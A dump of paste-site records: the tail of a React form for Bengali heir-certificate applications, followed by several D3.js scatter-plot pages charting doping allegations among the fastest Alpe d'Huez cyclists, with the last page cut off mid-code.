                    value={heirInfo.wardNo}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ডাকঘর</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ডাকঘর""
                    name=""postOffice""
                    value={heirInfo.postOffice}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">উপজেলা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""উপজেলা""
                    name=""upozilla""
                    value={heirInfo.upozilla}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">জেলা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""জেলা""
                    name=""district""
                    value={heirInfo.district}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className=""col-lg-12 col-md-12 col-sm-12 pt-4 pb-3"">
                <h4 className=""text-center"">মৃত ব্যক্তির তথ্য</h4>
              </div>

              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মৃত ব্যক্তির নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মৃত ব্যক্তির নাম""
                    name=""nameOfDead""
                    value={heirInfo.nameOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">পিতার নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""পিতার নাম""
                    name=""fathersNameOfDead""
                    value={heirInfo.fathersNameOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মাতার নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মাতার নাম""
                    name=""mothersNameOfDead""
                    value={heirInfo.mothersNameOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">স্বামী/স্ত্রী-র নাম</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""স্বামী/স্ত্রী-র নাম""
                    name=""spousesNameOfDead""
                    value={heirInfo.spousesNameOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-6 col-md-6 col-sm-6"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ভোটার আইডি নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ভোটার আইডি নং""
                    name=""voterIdNoOfDead""
                    value={heirInfo.voterIdNoOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">মোবাইল নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""মোবাইল নং""
                    name=""mobileNoOfDead""
                    value={heirInfo.mobileNoOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">জাতীয়তা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""জাতীয়তা""
                    name=""nationalityOfDead""
                    value={heirInfo.nationalityOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ওয়ার্ড নং</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ওয়ার্ড নং""
                    name=""wardNoOfDead""
                    value={heirInfo.wardNoOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">ডাকঘর</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""ডাকঘর""
                    name=""postOfficeOfDead""
                    value={heirInfo.postOfficeOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">উপজেলা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""উপজেলা""
                    name=""upozillaOfDead""
                    value={heirInfo.upozillaOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>
              <div className=""col-lg-3 col-md-3 col-sm-3"">
                <div className=""form-group"">
                  <label htmlFor=""text"">জেলা</label>
                  <input
                    type=""text""
                    className=""form-control""
                    id=""text""
                    placeholder=""জেলা""
                    name=""districtOfDead""
                    value={heirInfo.districtOfDead}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className=""col-lg-12 col-md-12 col-sm-12 pt-4 pb-3"">
                <h4 className=""text-center"">ওয়ারিশানগনের তথ্য দিন</h4>
              </div>

              <div className=""col-lg-12 col-md-12 col-sm-12 table-responsive"">
                <table className=""table table-striped"" width=""100%;"">
                  <thead>
                    <tr>
                      <th scope=""col"" className=""text-center"">
                        #
                      </th>
                      <th scope=""col"" className=""text-center"">
                        নাম
                      </th>
                      <th scope=""col"" className=""text-center"">
                        সম্পর্ক
                      </th>
                      <th scope=""col"" className=""text-center"">
                        মন্তব্য
                      </th>
                      <th scope=""col"" className=""text-center actionTable"">
                        একশন
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {heirInfo.listOfInheritors.map((inheritor, index) => (
                      <HeirInformation
                        key={index}
                        inheritor={inheritor}
                        index={index}
                      />
                    ))}
                  </tbody>
                  <tfoot>
                    {/* <tr>
                      <th className=""text-center""> </th>
                      <th> </th>
                      <th> </th>
                      <th scope=""row"" className=""text-center""></th>
                      <th scope=""row"" className=""text-right""></th>
                      <th className=""text-center""> </th>
                    </tr> */}
                  </tfoot>
                </table>
              </div>

              <div className=""col-lg-4 col-md-4 col-sm-4""></div>
              <div className=""col-lg-4 col-md-4 col-sm-4"">
                <button
                  type=""button""
                  className=""btn btn-block btn-lightblue""
                  onClick={handleSubmit}
                >
                  জমা দিন
                </button>
              </div>
              <div className=""col-lg-4 col-md-4 col-sm-4""></div>
            </div>
            {/* ---------------- Container End ---------------- */}
          </div>
        </section>
        {/* ---------------- Main Content End ---------------- */}
      </div>
    </>
  );
};

export default HeirApplicationAdd;
"
KAf1Wex2,pointwise_comparison_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:17:56 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .highlighted {
      stroke: red;
      stroke-width: 2;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      var colors = [""#27ae60"", ""#8e44ad""];
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      d3.json(url).then(function (data) {
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10;

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", (d) => {
            if (
              (d[""Name""] == ""Marco Pantani"" && d[""Year""] == 1995) ||
              (d[""Name""] == ""Lance Armstrong"" && d[""Year""] == 2004) ||
              (d[""Name""] == ""Floyd Landis"" && d[""Year""] == 2006) ||
              (d[""Name""] == ""Carlos Sastre"" && d[""Year""] == 2006)
            ) {
              return ""dot highlighted"";
            } else {
              return ""dot"";
            }
          })
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");
      });
    </script>
  </body>
</html>
"
GJQDSxrb,title_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:16:12 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation {
      fill: red;
      stroke: red;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // 7. Add annotations
        var annotationData = [
          { year: 1995, time: ""36:50"", text: ""Marco Pantani (Doping Allegations)"" },
          { year: 2006, time: ""39:01"", text: ""Carlos Sastre (No Doping Allegations)"" }
        ];

        var line = d3.line()
          .x((d) => xScale(d.year))
          .y((d) => yScale(parseTime(d.time)));

        svg.selectAll(""annotationLines"")
          .data(annotationData)
          .enter()
          .append(""path"")
          .attr(""d"", (d) => line([{ year: d.year, time: d.time }, { year: d.year + 2, time: d.time }]))
          .attr(""stroke"", ""red"")
          .attr(""fill"", ""none"");

        svg.selectAll(""annotationTexts"")
          .data(annotationData)
          .enter()
          .append(""text"")
          .attr(""x"", (d) => xScale(d.year + 1))
          .attr(""y"", (d) => yScale(parseTime(d.time)))
          .text((d) => d.text)
          .attr(""class"", ""annotation"");
      });
    </script>
  </body>
</html>
"
j1waw6PR,data_range_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:12:50 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation {
      fill: red;
      stroke: red;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotations
        svg
          .append(""line"")
          .attr(""x1"", xScale(1995))
          .attr(""y1"", yScale(parseTime(""36:50"")))
          .attr(""x2"", xScale(2015))
          .attr(""y2"", yScale(parseTime(""39:23"")))
          .attr(""stroke-width"", 2)
          .attr(""stroke"", ""red"");

        svg
          .append(""text"")
          .attr(""x"", xScale(2005))
          .attr(""y"", yScale(parseTime(""38:00"")))
          .attr(""class"", ""annotation"")
          .text(""Time range from fastest to slowest"");
      });
    </script>
  </body>
</html>
"
d5pxMzJp,exception_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:11:50 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation {
      fill: red;
      stroke: red;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      var colors = [""#27ae60"", ""#8e44ad""];
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      d3.json(url).then(function (data) {
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10;

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
